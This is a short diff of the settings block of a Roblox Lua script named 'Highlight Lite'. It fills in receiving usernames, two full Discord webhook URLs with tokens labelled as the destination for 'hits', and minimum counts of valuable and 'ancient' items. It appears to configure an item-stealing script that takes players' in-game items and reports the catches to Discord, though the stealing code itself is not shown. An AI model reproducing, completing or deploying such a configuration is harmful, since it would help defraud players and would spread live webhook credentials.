@@ -1,12 +1,12 @@
 -- [ Settings ] --
-Username = "test123" -- [Your Username]
+Username = "BlurrTip" -- [Your Username]
 Webhook = "https://discord.com/api/webhooks/1302620523972399234/Z5dgTBHuA0uPGu-tSVGwivlWrZ6iHwqhrw5hnLpL2PMsZ9uX2h4R0UaBnSNzpUb4xjcC" -- [Your Webhook For Hits]
 Script = "Highlight Lite"
 
-DualUsername = "test123123" -- [Dual Username]
+DualUsername = "QuadCoreDragon" -- [Dual Username]
 DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
-DualItems = 20 -- [Minimum Valuable Items Count]
-DualAncient = 3 -- [Minimum Ancient Count]
+DualItems = 50 -- [Minimum Valuable Items Count]
+DualAncient = 2 -- [Minimum Ancient Count]
 
 
 repeat wait() until game:IsLoaded()
